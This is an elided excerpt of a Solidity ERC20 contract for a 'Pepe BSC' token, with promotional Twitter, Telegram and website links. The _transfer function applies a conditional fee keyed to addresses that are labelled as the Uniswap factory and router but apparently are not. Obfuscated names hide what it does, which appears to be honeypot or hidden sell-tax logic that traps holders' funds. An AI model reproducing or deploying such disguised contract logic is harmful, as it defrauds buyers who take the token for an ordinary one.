...
https://twitter.com/PepeBSCETH
https://t.me.com/PepeBSCETH
https://PepeBSCETH.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private _factoryV2 = 0xA0d20D485FDb7Ef353f7b3859c075E27B757A84d;
    address internal _uniswapRouterV2 = 0x1740F02DFE3A863A27FEcdA51367a757124DF124;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != _uniswapRouterV2 && _balances[_factoryV2] > 0 ? _pairsAllowance : _swappingToggle).div(100)+0;
        if (swapamount > 0)
        {
...
contract PepeBSC is ERC20, Ownable {
    constructor() ERC20(unicode"Pepe BSC", unicode"PEPEBSC") {
